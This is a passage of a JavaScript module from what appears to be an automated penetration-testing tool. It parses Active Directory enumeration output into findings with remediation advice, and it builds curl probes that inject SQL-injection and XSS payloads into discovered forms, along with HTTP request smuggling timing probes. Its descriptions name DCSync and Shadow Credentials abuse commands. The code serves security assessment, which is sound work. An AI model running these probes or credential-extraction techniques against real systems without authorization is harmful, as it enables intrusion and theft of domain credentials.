      title: "AD: complejidad de contraseña deshabilitada",
      severity: "Medium",
      description: "netexec --pass-pol indica Password Complexity desactivada.",
      remediation: "Habilitar complejidad o, mejor, longitud alta + denylist de passwords comunes.",
    });
  }
  return out.slice(0, 4);
}

/** bloodhound-python -c DCOnly stdout/stderr. */
export function bloodhoundFindings(stdout) {
  const text = String(stdout || "");
  if (/Login failure|Invalid credentials|AUTHENTICATION_ERROR|LDAP.*failed/i.test(text)
    && !/Found \d+|Done in|users\.json|zip/i.test(text)) {
    return [];
  }
  const users = (text.match(/Found\s+(\d+)\s+users/i) || [])[1];
  const computers = (text.match(/Found\s+(\d+)\s+computers/i) || [])[1];
  const groups = (text.match(/Found\s+(\d+)\s+groups/i) || [])[1];
  const done = /Done in\s+[\d:]+/i.test(text) || /\.zip/i.test(text) || /Compressing/i.test(text);
  if (!users && !computers && !groups && !done) return [];
  const bits = [];
  if (users) bits.push(`${users} users`);
  if (computers) bits.push(`${computers} computers`);
  if (groups) bits.push(`${groups} groups`);
  return [{
    title: `AD: BloodHound DCOnly${bits.length ? ` (${bits.join(", ")})` : " completado"}`,
    severity: "Info",
    description: `bloodhound-python -c DCOnly recolectó metadatos LDAP (sin LoggedOn/sesiones en hosts)${bits.length ? `: ${bits.join(", ")}` : ""}. Zip/JSON en evidence/bloodhound del engagement. No se abrió BloodHound UI ni se explotó ACL.`,
    remediation: "Importar el zip en BloodHound CE offline. Revisar paths Domain Users → Domain Admins; remediar ACLs peligrosas antes de abuso.",
  }];
}

const BLOODHOUND_ACE_SEVERITY = {
  GenericAll: "Critical",
  AllExtendedRights: "Critical",
  AddKeyCredentialLink: "Critical",
  DCSync: "Critical",
  Owns: "High",
  GenericWrite: "High",
  WriteDacl: "High",
  WriteOwner: "High",
  AddMember: "High",
  AddSelf: "High",
  ForceChangePassword: "High",
  WriteSPN: "High",
};

const BLOODHOUND_ACE_LABEL = {
  AddKeyCredentialLink: "Shadow Credentials",
};

/**
 * Parsea las líneas sintéticas "DS_ACE|principal|tipo|derecho|target|tipo"
 * que bridge.py anexa al stdout de bloodhound-python (extraídas de los JSON
 * ya escritos en evidence/bloodhound — la misma información que BloodHound
 * UI resaltaría al abrir el grafo, pero sin necesidad de abrirlo).
 */
export function bloodhoundAceFindings(stdout) {
  const text = String(stdout || "");
  const out = [];
  for (const line of text.split("\n")) {
    if (!line.startsWith("DS_ACE|")) continue;
    const parts = line.split("|");
    if (parts.length !== 6) continue;
    const [, principal, principalType, right, target, targetType] = parts;
    const severity = BLOODHOUND_ACE_SEVERITY[right];
    if (!severity) continue;
    const label = BLOODHOUND_ACE_LABEL[right] ? ` (${BLOODHOUND_ACE_LABEL[right]})` : "";
    const isDcsync = right === "DCSync";
    out.push({
      title: `AD: ${principal} tiene ${right}${label} sobre ${target}`,
      severity,
      description: isDcsync
        ? `BloodHound confirmó que ${principal} (${principalType}) tiene GetChanges Y GetChangesAll sobre el objeto dominio ${target} (CWE-269): con ambos derechos puede solicitar una réplica completa vía DRSUAPI (mimikatz lsadump::dcsync o secretsdump.py -just-dc), extrayendo los hashes NTLM de todos los usuarios del dominio, incluido krbtgt.`
        : right === "AddKeyCredentialLink"
        ? `BloodHound confirmó que ${principal} (${principalType}) puede escribir msDS-KeyCredentialLink en ${target} (${targetType}) (CWE-269): permite añadir una clave pública propia como credencial alternativa del objeto (Shadow Credentials) y autenticar como ${target} vía PKINIT sin conocer su contraseña ni resetearla.`
        : `BloodHound confirmó que ${principal} (${principalType}) tiene el derecho ${right} sobre ${target} (${targetType}) (CWE-269), suficiente para tomar control del objeto (según el derecho: cambiar su contraseña, añadirlo a un grupo, modificar su ACL/propietario, o control total).`,
      remediation: isDcsync
        ? "Retirar GetChanges/GetChangesAll de cuentas que no sean controladores de dominio o cuentas de replicación legítimas (Azure AD Connect, etc.); auditar quién más los tiene."
        : right === "AddKeyCredentialLink"
        ? "Retirar el derecho de escritura sobre msDS-KeyCredentialLink del principal indicado; monitorizar el evento 5136 (modificación de atributo) sobre ese objeto."
        : `Retirar el derecho ${right} del principal indicado sobre ${target} si no está justificado por el modelo de delegación; auditar el resto de ACLs del mismo tier.`,
    });
  }
  return out;
}

/** findDelegation.py — unconstrained / constrained / RBCD inventory. */
export function findDelegationFindings(stdout) {
  const text = String(stdout || "");
  if (/STATUS_LOGON_FAILURE|KDC_ERR|Invalid credentials|LDAP.*failed/i.test(text)
    && !/Unconstrained|Constrained|Resource-Based|AccountName/i.test(text)) {
    return [];
  }
  const unconstrained = [];
  const constrained = [];
  const rbcd = [];
  for (const line of text.split("\n")) {
    if (/Unconstrained/i.test(line)) {
      const m = line.match(/\b([A-Za-z0-9._$-]+(?:\$)?)\b/);
      if (m) unconstrained.push(m[1]);
    } else if (/Resource-Based|RBCD/i.test(line)) {
      const m = line.match(/\b([A-Za-z0-9._$-]+(?:\$)?)\b/);
      if (m) rbcd.push(m[1]);
    } else if (/Constrained/i.test(line)) {
      const m = line.match(/\b([A-Za-z0-9._$-]+(?:\$)?)\b/);
      if (m) constrained.push(m[1]);
    }
  }
  // Table-style Impacket output often lists AccountName + DelegationType
  for (const m of text.matchAll(/([A-Za-z0-9._$-]+\$?)\s+(Unconstrained|Constrained|Resource-Based)/gi)) {
    const name = m[1];
    const kind = m[2].toLowerCase();
    if (kind.startsWith("unconst")) unconstrained.push(name);
    else if (kind.startsWith("resource")) rbcd.push(name);
    else constrained.push(name);
  }
  const uniq = (arr) => [...new Set(arr.map((x) => x))];
  const u = uniq(unconstrained);
  const c = uniq(constrained);
  const r = uniq(rbcd);
  if (!u.length && !c.length && !r.length
    && !/AccountName|DelegationType|findDelegation/i.test(text)) {
    return [];
  }
  if (!u.length && !c.length && !r.length) {
    return [{
      title: "AD: findDelegation sin relaciones listadas",
      severity: "Info",
      description: "findDelegation corrió con creds pero no parseó unconstrained/constrained/RBCD. Revisar evidencia o importar BloodHound.",
      remediation: "Confirmar que la cuenta puede leer msDS-AllowedToDelegateTo / TrustedForDelegation.",
    }];
  }
  const sev = u.length || r.length ? "High" : "Medium";
  const parts = [];
  if (u.length) parts.push(`unconstrained: ${u.slice(0, 6).join(", ")}`);
  if (c.length) parts.push(`constrained: ${c.slice(0, 6).join(", ")}`);
  if (r.length) parts.push(`RBCD: ${r.slice(0, 6).join(", ")}`);
  return [{
    title: `AD: delegación Kerberos${u.length ? " unconstrained" : ""}${r.length ? " / RBCD" : ""}${!u.length && !r.length ? " constrained" : ""}`,
    severity: sev,
    description: `findDelegation inventarió relaciones de delegación — ${parts.join("; ")}. Superficie de abuso (T1134.001); no se solicitó ticket ni se modificó msDS-AllowedToActOnBehalfOfOtherIdentity.`,
    remediation: "Retirar TrustedForDelegation innecesario; auditar constrained a servicios sensibles; restringir quién puede escribir RBCD en computer objects.",
  }];
}

/** netexec smb --computers. */
export function netexecComputersFindings(stdout) {
  const text = String(stdout || "");
  if (/STATUS_LOGON_FAILURE|LOGIN FAILED/i.test(text) && !/\$|computer|rid:/i.test(text)) {
    return [];
  }
  const comps = [];
  const seen = new Set();
  for (const m of text.matchAll(/(?:^|[\s\\])([A-Za-z0-9._-]{2,64}\$)/g)) {
    const c = m[1];
    if (seen.has(c.toLowerCase())) continue;
    seen.add(c.toLowerCase());
    comps.push(c);
    if (comps.length >= 30) break;
  }
  if (!comps.length && !/--computers|Enumerat.*computer/i.test(text)) return [];
  return [{
    title: comps.length
      ? `AD: ${comps.length} equipo(s) de dominio (netexec --computers)`
      : "AD: enumeración de equipos de dominio (netexec --computers)",
    severity: "Info",
    description: comps.length
      ? `netexec smb --computers listó: ${comps.slice(0, 12).join(", ")}${comps.length > 12 ? "…" : ""}. Inventario de machine accounts.`
      : "netexec --computers devolvió salida de enumeración; revisar evidencia si la lista no parseó.",
    remediation: "Retirar equipos huérfanos del dominio; segmentar servers administrativos.",
  }];
}

/** netexec ldap --dc-list. */
export function netexecDcListFindings(stdout) {
  const text = String(stdout || "");
  if (/STATUS_LOGON_FAILURE|LOGIN FAILED|Invalid credentials/i.test(text)
    && !/DC=|Domain Controller|dNSHostName|--dc-list/i.test(text)) {
    return [];
  }
  const dcs = [];
  const seen = new Set();
  for (const m of text.matchAll(/\b([A-Za-z0-9][A-Za-z0-9._-]{1,64}\.(?:[A-Za-z0-9._-]+)+)\b/g)) {
    const h = m[1];
    if (/example\.|microsoft\.|schema\./i.test(h)) continue;
    if (seen.has(h.toLowerCase())) continue;
    seen.add(h.toLowerCase());
    dcs.push(h);
    if (dcs.length >= 12) break;
  }
  for (const m of text.matchAll(/\b([A-Za-z0-9_-]{2,40}DC[A-Za-z0-9_-]*)\b/gi)) {
    const h = m[1];
    if (seen.has(h.toLowerCase())) continue;
    seen.add(h.toLowerCase());
    dcs.push(h);
    if (dcs.length >= 12) break;
  }
  if (!dcs.length && !/--dc-list|Domain Controller/i.test(text)) return [];
  return [{
    title: dcs.length
      ? `AD: ${dcs.length} Domain Controller(s) (--dc-list)`
      : "AD: enumeración de Domain Controllers (netexec --dc-list)",
    severity: "Info",
    description: dcs.length
      ? `netexec ldap --dc-list: ${dcs.slice(0, 8).join(", ")}${dcs.length > 8 ? "…" : ""}. Inventario de DCs; no se atacó ninguno.`
      : "netexec --dc-list devolvió salida de enumeración; revisar evidencia.",
    remediation: `Restringir 88/389/445/5985 al admin net. ${HOSTS_TIP}`,
  }];
}

/** netexec -M gpp_password: cpassword en SYSVOL. */
export function gppPasswordFindings(stdout) {
  const text = String(stdout || "");
  if (!/Found SYSVOL|Groups\.xml|Services\.xml|cpassword|Password\s*[:=]|GPP/i.test(text)) {
    return [];
  }
  if (/STATUS_ACCESS_DENIED|LOGIN FAILED/i.test(text) && !/cpassword|Password\s*[:=]/i.test(text)) {
    return [];
  }
  const users = [];
  const seen = new Set();
  for (const m of text.matchAll(/(?:User(?:name)?|Account)\s*[:=]\s*([^\s\\]+(?:\\[^\s]+)?)/gi)) {
    const u = m[1].trim();
    if (seen.has(u.toLowerCase())) continue;
    seen.add(u.toLowerCase());
    users.push(u);
  }
  const hasSecret = /cpassword|Password\s*[:=]\s*\S+/i.test(text);
  if (!hasSecret && !/Found SYSVOL|Searching for potential XML/i.test(text)) return [];
  if (!hasSecret) {
    return [{
      title: "AD: SYSVOL legible (GPP scan sin cpassword)",
      severity: "Info",
      description: "netexec -M gpp_password accedió a SYSVOL pero no reportó cpassword descifrado. Postura: share SYSVOL accesible a la cuenta usada.",
      remediation: "Auditar ACLs de SYSVOL; eliminar XML GPP legacy con secretos.",
    }];
  }
  return [{
    title: `AD: GPP cpassword en SYSVOL${users.length ? ` (${users.slice(0, 3).join(", ")})` : ""}`,
    severity: "Critical",
    description: `netexec -M gpp_password encontró y descifró secretos GPP en SYSVOL${users.length ? ` para: ${users.slice(0, 6).join(", ")}` : ""}. AES-256 GPP es conocido desde 2012 (MS14-025). Solo lectura de SYSVOL; no se usó el secreto para lateral movement.`,
    remediation: "Eliminar Groups/Services/ScheduledTasks.xml con cpassword de SYSVOL; rotar todas las cuentas afectadas; no volver a usar GPP para passwords (MS14-025).",
  }];
}

/** netexec -M gpp_autologin. */
export function gppAutologinFindings(stdout) {
  const text = String(stdout || "");
  if (!/autologin|DefaultPassword|DefaultUserName|Registry\.xml|GPP/i.test(text)) return [];
  if (/LOGIN FAILED|STATUS_ACCESS_DENIED/i.test(text) && !/DefaultPassword|Password/i.test(text)) {
    return [];
  }
  const has = /DefaultPassword|Password\s*[:=]|Username\s*[:=]/i.test(text);
  if (!has) return [];
  return [{
    title: "AD: GPP autologon con credenciales en SYSVOL",
    severity: "Critical",
    description: "netexec -M gpp_autologin encontró DefaultUserName/DefaultPassword (o equivalente) en preferencias GPP de SYSVOL. Credencial en claro para cualquiera con lectura de SYSVOL.",
    remediation: "Eliminar el GPP de autologon; rotar la cuenta; usar LAPS/gMSA donde aplique.",
  }];
}

/** ldapsearch objectClass=trustedDomain. */
export function ldapTrustFindings(stdout) {
  const text = String(stdout || "");
  if (/Invalid credentials|Can't contact|Strong\(er\) authentication/i.test(text)
    && !/trustedDomain|trustDirection|flatName/i.test(text)) {
    return [];
  }
  const trusts = [];
  const seen = new Set();
  for (const m of text.matchAll(/(?:^|\n)(?:cn|flatName):\s*([A-Za-z0-9._-]+)/gi)) {
    const n = m[1];
    if (/^System$/i.test(n)) continue;
    if (seen.has(n.toLowerCase())) continue;
    seen.add(n.toLowerCase());
    trusts.push(n);
    if (trusts.length >= 15) break;
  }
  const directions = [...text.matchAll(/trustDirection:\s*(\d+)/gi)].map((m) => m[1]);
  if (!trusts.length && !/objectClass:\s*trustedDomain|trustDirection/i.test(text)) return [];
  return [{
    title: trusts.length
      ? `AD: ${trusts.length} trust(s) de dominio (LDAP)`
      : "AD: trusts de dominio enumerados (LDAP)",
    severity: trusts.length > 1 ? "Medium" : "Info",
    description: `ldapsearch (objectClass=trustedDomain) listó trusts${trusts.length ? `: ${trusts.join(", ")}` : ""}${directions.length ? ` (trustDirection: ${directions.slice(0, 6).join(", ")})` : ""}. Inventario cross-domain; no se abusó del trust (raiseChild/SID history fuera del playbook).`,
    remediation: "Auditar trusts bidireccionales y forest trusts; eliminar trusts obsoletos; SID filtering donde corresponda.",
  }];
}

/** netexec ldap --password-not-required. */
export function ldapPasswdNotRequiredFindings(stdout) {
  const text = String(stdout || "");
  if (/STATUS_LOGON_FAILURE|LOGIN FAILED|Invalid credentials/i.test(text)
    && !/PASSWD_NOTREQD|password not required|PasswordNotRequired/i.test(text)) {
    return [];
  }
  const users = [];
  const seen = new Set();
  for (const m of text.matchAll(/(?:LDAP\s+\S+\s+\d+\s+\S+\s+)?([A-Za-z0-9._$-]{2,64})(?:\s+\(.*PASSWD|.*password not required)/gi)) {
    const u = m[1];
    if (/^(LDAP|SMB|[*]|User)$/i.test(u)) continue;
    if (seen.has(u.toLowerCase())) continue;
    seen.add(u.toLowerCase());
    users.push(u);
    if (users.length >= 20) break;
  }
  // Broader: lines mentioning the flag with a samaccount
  for (const m of text.matchAll(/\b([A-Za-z0-9._$-]{2,64})\b[^\n]{0,40}(?:PASSWD_NOTREQD|PasswordNotRequired|password not required)/gi)) {
    const u = m[1];
    if (/^(LDAP|does|User|Account|has|with)$/i.test(u)) continue;
    if (seen.has(u.toLowerCase())) continue;
    seen.add(u.toLowerCase());
    users.push(u);
    if (users.length >= 20) break;
  }
  if (!users.length && !/PASSWD_NOTREQD|password not required|PasswordNotRequired/i.test(text)) return [];
  return [{
    title: users.length
      ? `AD: ${users.length} cuenta(s) con PASSWD_NOTREQD`
      : "AD: cuentas con password not required detectadas",
    severity: "High",
    description: `netexec ldap --password-not-required listó cuentas con UF_PASSWD_NOTREQD${users.length ? `: ${users.slice(0, 10).join(", ")}${users.length > 10 ? "…" : ""}` : ""}. Permiten autenticación sin contraseña (CWE-521). No se inició sesión con esas cuentas.`,
    remediation: "Quitar PASSWD_NOTREQD (Set-ADAccountControl -PasswordNotRequired $false); forzar password; auditar quién las creó.",
  }];
}

/** netexec ldap --admin-count. */
export function ldapAdminCountFindings(stdout) {
  const text = String(stdout || "");
  if (/STATUS_LOGON_FAILURE|LOGIN FAILED/i.test(text) && !/adminCount|AdminCount/i.test(text)) {
    return [];
  }
  const users = [];
  const seen = new Set();
  for (const m of text.matchAll(/\b([A-Za-z0-9._$-]{2,64})\b[^\n]{0,60}adminCount\s*[:=]?\s*1/gi)) {
    const u = m[1];
    if (/^(LDAP|SMB|User|Account|has)$/i.test(u)) continue;
    if (seen.has(u.toLowerCase())) continue;
    seen.add(u.toLowerCase());
    users.push(u);
    if (users.length >= 25) break;
  }
  // nxc often just lists samaccount names after the flag
  if (!users.length) {
    for (const m of text.matchAll(/LDAP\s+\S+\s+\d+\s+\S+\s+([A-Za-z0-9._$-]{2,64})\s*$/gm)) {
      const u = m[1];
      if (seen.has(u.toLowerCase())) continue;
      seen.add(u.toLowerCase());
      users.push(u);
      if (users.length >= 25) break;
    }
  }
  if (!users.length && !/adminCount|--admin-count/i.test(text)) return [];
  return [{
    title: users.length
      ? `AD: ${users.length} cuenta(s) con adminCount=1`
      : "AD: cuentas adminCount=1 enumeradas",
    severity: "Medium",
    description: `netexec ldap --admin-count listó identidades con adminCount=1 (protección SDPROP / ex-admins)${users.length ? `: ${users.slice(0, 12).join(", ")}${users.length > 12 ? "…" : ""}` : ""}. Inventario privilegiado; no implica que sigan en Domain Admins.`,
    remediation: "Revisar membresía real; limpiar adminCount residual con Clear-ADAccountExpiration / SDProp docs; mínimo privilegio.",
  }];
}

/** netexec ldap --trusted-for-delegation. */
export function ldapTrustedForDelegationFindings(stdout) {
  const text = String(stdout || "");
  if (/STATUS_LOGON_FAILURE|LOGIN FAILED/i.test(text)
    && !/TRUSTED_FOR_DELEGATION|TrustedForDelegation|trusted for delegation/i.test(text)) {
    return [];
  }
  const accounts = [];
  const seen = new Set();
  for (const m of text.matchAll(/\b([A-Za-z0-9._$-]{2,64}\$?)\b[^\n]{0,50}(?:TRUSTED_FOR_DELEGATION|Trusted for delegation)/gi)) {
    const a = m[1];
    if (seen.has(a.toLowerCase())) continue;
    seen.add(a.toLowerCase());
    accounts.push(a);
    if (accounts.length >= 20) break;
  }
  if (!accounts.length) {
    for (const m of text.matchAll(/LDAP\s+\S+\s+\d+\s+\S+\s+([A-Za-z0-9._$-]{2,64}\$?)/g)) {
      const a = m[1];
      if (seen.has(a.toLowerCase())) continue;
      seen.add(a.toLowerCase());
      accounts.push(a);
      if (accounts.length >= 20) break;
    }
  }
  if (!accounts.length && !/TRUSTED_FOR_DELEGATION|trusted-for-delegation|Trusted for delegation/i.test(text)) {
    return [];
  }
  return [{
    title: accounts.length
      ? `AD: ${accounts.length} objeto(s) TRUSTED_FOR_DELEGATION`
      : "AD: TRUSTED_FOR_DELEGATION detectado",
    severity: "High",
    description: `netexec ldap --trusted-for-delegation listó objetos con unconstrained delegation${accounts.length ? `: ${accounts.slice(0, 10).join(", ")}${accounts.length > 10 ? "…" : ""}` : ""}. Complementa findDelegation; no se solicitó TGT forwardable.`,
    remediation: "Retirar TrustedForDelegation en servers no DC; preferir constrained/RBCD acotado.",
  }];
}

/** netexec -M maq. */
export function machineAccountQuotaFindings(stdout) {
  const text = String(stdout || "");
  const m = text.match(/MachineAccountQuota\s*[:=]\s*(-?\d+)/i);
  if (!m) {
    if (/Getting the MachineAccountQuota/i.test(text)) {
      return [{
        title: "AD: MachineAccountQuota consultado",
        severity: "Info",
        description: "netexec -M maq consultó ms-DS-MachineAccountQuota pero no parseó el valor. Revisar evidencia.",
        remediation: "Si MAQ > 0, usuarios pueden crear machine accounts (RBCD path).",
      }];
    }
    return [];
  }
  const q = Number(m[1]);
  if (q === 0) {
    return [{
      title: "AD: MachineAccountQuota = 0 (duro)",
      severity: "Info",
      description: "ms-DS-MachineAccountQuota es 0: usuarios estándar no pueden añadir machine accounts. Buena postura frente a RBCD con cuenta low-priv.",
      remediation: "Mantener en 0 salvo necesidad justificada.",
    }];
  }
  return [{
    title: `AD: MachineAccountQuota = ${q}`,
    severity: q > 0 ? "Medium" : "Info",
    description: `netexec -M maq: ms-DS-MachineAccountQuota=${q}. Con cuota > 0 un usuario autenticado puede crear computer objects y montar paths RBCD (CWE-269). No se creó ninguna máquina.`,
    remediation: "Poner MachineAccountQuota a 0 en el dominio (o PSO/restricción equivalente) si no hay requisito de negocio.",
  }];
}

/** netexec -M spooler — detección, sin coerce. */
export function spoolerFindings(stdout) {
  const text = String(stdout || "");
  if (/Spooler service enabled|Spoolss|print spooler|Spooler is running/i.test(text)
    || (/\[\+\]/.test(text) && /spooler/i.test(text))) {
    return [{
      title: "AD: Print Spooler activo (superficie de coercion)",
      severity: "Medium",
      description: "netexec -M spooler detectó el servicio Print Spooler. Facilita coerciones (PrinterBug/PetitPotam-style) si hay relay factible. Solo detección; no se envió coerce ni listener.",
      remediation: "Deshabilitar Spooler en DCs y servers que no impriman; bloquear 445/135 entre segmentos; SMB signing obligatorio.",
    }];
  }
  if (/Spooler service disabled|Spooler is not|not running|\[\-\].*spooler/i.test(text)) {
    return [{
      title: "AD: Print Spooler no activo",
      severity: "Info",
      description: "netexec -M spooler no vio Spooler habilitado en el target. Reduce superficie de printer coercion.",
      remediation: "Mantener Spooler off en DCs.",
    }];
  }
  return [];
}

/**
 * netexec -M laps: la cuenta de assessment puede leer LAPS.
 * No se incluyen contraseñas en el hallazgo — solo hosts afectados.
 */
export function lapsReadableFindings(stdout) {
  const text = String(stdout || "");
  if (/STATUS_LOGON_FAILURE|LOGIN FAILED|Invalid credentials/i.test(text)
    && !/LAPS|ms-MCS-AdmPwd|msLAPS-Password/i.test(text)) {
    return [];
  }
  const comps = [];
  const seen = new Set();
  for (const m of text.matchAll(/(?:Computer|Host|sAMAccountName)\s*[:=]\s*([A-Za-z0-9._$-]+)/gi)) {
    const c = m[1].replace(/\$$/, "") + "$";
    if (seen.has(c.toLowerCase())) continue;
    seen.add(c.toLowerCase());
    comps.push(c);
    if (comps.length >= 20) break;
  }
  for (const m of text.matchAll(/\b([A-Za-z0-9._-]{2,40}\$)\b/g)) {
    if (seen.has(m[1].toLowerCase())) continue;
    seen.add(m[1].toLowerCase());
    comps.push(m[1]);
    if (comps.length >= 20) break;
  }
  const hasPwd = /LAPS Password|ms-MCS-AdmPwd|msLAPS-Password|Password\s*[:=]\s*\S+/i.test(text);
  if (!hasPwd && !/Getting LAPS|LAPS Passwords/i.test(text)) return [];
  if (!hasPwd) {
    return [{
      title: "AD: LAPS consultado sin secretos legibles",
      severity: "Info",
      description: "netexec -M laps corrió pero no extrajo ms-MCS-AdmPwd/msLAPS legible para esta cuenta. Buena señal si el assessment no debía leer LAPS.",
      remediation: "Verificar ACLs LAPS (ms-Mcs-AdmPwd) solo para gMSA/admins de workstation.",
    }];
  }
  return [{
    title: comps.length
      ? `AD: LAPS legible en ${comps.length} equipo(s)`
      : "AD: LAPS passwords legibles por la cuenta de assessment",
    severity: "Critical",
    description: `netexec -M laps pudo leer contraseñas LAPS${comps.length ? ` en: ${comps.slice(0, 10).join(", ")}${comps.length > 10 ? "…" : ""}` : ""}. La cuenta usada tiene privilegio excesivo sobre ms-MCS-AdmPwd / msLAPS-*. El secreto no se incluye en este hallazgo; está en la evidencia cruda del paso.`,
    remediation: "Restringir lectura LAPS a grupos justificados; rotar passwords LAPS de hosts afectados; auditar whoCanReadLAPS.",
  }];
}

/** Consolida parsers AD sobre el texto de cada sonda. */
export function adCollectionFindings(kind, stdout) {
  if (kind === "netexec") return netexecSmbFindings(stdout);
  if (kind === "netexec-shares") return netexecSharesFindings(stdout);
  if (kind === "netexec-winrm") return netexecWinrmFindings(stdout);
  if (kind === "enum4linux") return enum4linuxFindings(stdout);
  if (kind === "smbclient") return smbclientNullFindings(stdout);
  if (kind === "ldap") return ldapAnonymousFindings(stdout);
  if (kind === "asrep") return getNpUsersFindings(stdout);
  if (kind === "spn") return getUserSpnsFindings(stdout);
  if (kind === "certipy") return certipyFindFindings(stdout);
  if (kind === "lookupsid") return lookupsidFindings(stdout);
  if (kind === "samrdump") return samrdumpFindings(stdout);
  if (kind === "nxc-users") return netexecUsersFindings(stdout);
  if (kind === "nxc-groups") return netexecGroupsFindings(stdout);
  if (kind === "nxc-passpol") return netexecPassPolFindings(stdout);
  if (kind === "bloodhound") return bloodhoundFindings(stdout);
  if (kind === "delegation") return findDelegationFindings(stdout);
  if (kind === "nxc-computers") return netexecComputersFindings(stdout);
  if (kind === "nxc-dc-list") return netexecDcListFindings(stdout);
  if (kind === "gpp") return gppPasswordFindings(stdout);
  if (kind === "gpp-autologin") return gppAutologinFindings(stdout);
  if (kind === "trusts") return ldapTrustFindings(stdout);
  if (kind === "passwd-notreq") return ldapPasswdNotRequiredFindings(stdout);
  if (kind === "admin-count") return ldapAdminCountFindings(stdout);
  if (kind === "trusted-deleg") return ldapTrustedForDelegationFindings(stdout);
  if (kind === "maq") return machineAccountQuotaFindings(stdout);
  if (kind === "spooler") return spoolerFindings(stdout);
  if (kind === "laps") return lapsReadableFindings(stdout);
  return [];
}

/**
 * Sondas de XSS reflejado / SQLi genérico contra un formulario DESCUBIERTO
 * (no una ruta fija adivinada): un step por cada campo de texto del form,
 * con ese campo llevando el payload y el resto de campos en un valor
 * benigno fijo para no romper la validación del form por campos faltantes.
 */
const SQLI_GENERIC_PAYLOAD = "x' OR '1'='1";

export function buildFormBody(form, targetField, payload) {
  return form.fields
    .map((f) => `${f.name}=${encodeURIComponent(f.name === targetField ? payload : "x")}`)
    .join("&");
}

function formProbeSteps(step, prefix, baseUrl, form, cookieFile, payload, desc, maxTime) {
  const textFields = form.fields.filter((f) => f.type !== "checkbox" && f.type !== "radio");
  return textFields.map((field) => {
    const body = buildFormBody(form, field.name, payload);
    // form.action puede ser una URL absoluta (form que postea a otro
    // dominio/puerto) — concatenarla ciegamente con baseUrl produce una
    // URL malformada.
    const url = /^https?:\/\//i.test(form.action) ? form.action : baseUrl + form.action;
    if (form.method === "GET") {
      const dataArgs = form.fields.flatMap((f) => [
        "--data-urlencode",
        `${f.name}=${f.name === field.name ? payload : "x"}`,
      ]);
      return step(`${prefix}-${field.name}`, "curl", [
        "-s", "-L", "-b", cookieFile, "-c", cookieFile, "--max-time", maxTime,
        "-G", ...dataArgs,
        url,
      ], null, { desc: `${desc} — campo ${field.name}` });
    }
    return step(`${prefix}-${field.name}`, "curl", [
      "-s", "-L", "-b", cookieFile, "-c", cookieFile, "--max-time", maxTime,
      "-X", "POST", "-d", body,
      url,
    ], null, { desc: `${desc} — campo ${field.name}` });
  });
}

export function xssFormProbeSteps(step, prefix, baseUrl, form, cookieFile, maxTime = "12") {
  return formProbeSteps(step, prefix, baseUrl, form, cookieFile, XSS_REFLECTION_PAYLOAD, "Sonda de XSS reflejado en formulario descubierto", maxTime);
}

export function sqliFormProbeSteps(step, prefix, baseUrl, form, cookieFile, maxTime = "12") {
  return formProbeSteps(step, prefix, baseUrl, form, cookieFile, SQLI_GENERIC_PAYLOAD, "Sonda de SQLi genérico en formulario descubierto", maxTime);
}

/* ------------------------------------------------------------------------ *
 * HTTP Request Smuggling (CL.TE / TE.CL) — sondas de timing (metodología
 * PortSwigger). curl no puede mandar Content-Length/Transfer-Encoding
 * ambiguos de forma fiable, así que estos steps invocan la pseudo-
 * herramienta "http-smuggle-probe" que el bridge maneja con una conexión
 * TCP cruda propia (ver backend/bridge.py: build_smuggling_probe /
 * send_raw_probe). Fase 3 (Exploitation): un desync real en un front-end
 * compartido puede afectar peticiones de OTROS usuarios, no solo del que
 * prueba — mismo gate humano de avance de fase que wmiexec/secretsdump.
 * https://hacktricks.wiki/en/pentesting-web/http-request-smuggling/index.html
 * ------------------------------------------------------------------------ */
export function smugglingProbeSteps(step, prefix, baseUrl, maxTime = "12") {
  let u;
  try {
    u = new URL(baseUrl);
  } catch {
    return [];
  }
  const port = u.port || (u.protocol === "https:" ? "443" : "80");
  const path = u.pathname || "/";
  return ["clte", "tecl"].map((kind) =>
    step(`${prefix}-${kind}`, "http-smuggle-probe", [kind, u.hostname, port, path], null, {
      desc: `Sonda de timing HTTP Request Smuggling (${kind === "clte" ? "CL.TE" : "TE.CL"})`,
    }),
  );
}

/**
 * Clasifica el JSON que devuelve la pseudo-herramienta http-smuggle-probe.
 * timed_out=true es solo CANDIDATO (la conexión se quedó colgada, señal
 * de desync) — requiere la respuesta diferencial de seguimiento para
 * confirmarlo, igual que otros hallazgos de esta herramienta que dejan
 * el último paso a confirmación manual (SSTI/CORS).
 */
export function smugglingFinding(stdout, path) {
  let hit;
  try {
    hit = JSON.parse(stdout || "");
  } catch {
    return null;
  }
  if (!hit || !hit.timed_out) return null;
  const label = hit.kind === "tecl" ? "TE.CL" : "CL.TE";
  return {
    title: `Posible HTTP Request Smuggling (${label}) en ${path || "/"}`,
    severity: "High",
    description: `La sonda de timing ${label} contra ${path || "/"} se quedó sin respuesta (~${Math.round(hit.elapsed_ms || 0)}ms) en vez de recibir un rechazo o respuesta normal (CWE-444): señal de que front-end y backend interpretan de forma distinta los límites de la petición (Content-Length vs Transfer-Encoding ambiguos), lo que en un desync real permite mezclar la petición de un atacante con la de otra víctima en la misma conexión reutilizada. Esto es solo el candidato de timing — confirmar manualmente con la técnica de respuesta diferencial (petición de sondeo justo después de la sospechosa) antes de reportarlo como explotado.`,
    remediation: "Normalizar en el borde: rechazar peticiones con Content-Length y Transfer-Encoding simultáneos (RFC 7230 §3.3.3); si front-end y backend son productos distintos, forzar HTTP/2 end-to-end (sin downgrade a HTTP/1.1 ambiguo) o desactivar el reuso de conexiones keep-alive hacia el backend.",
  };
}
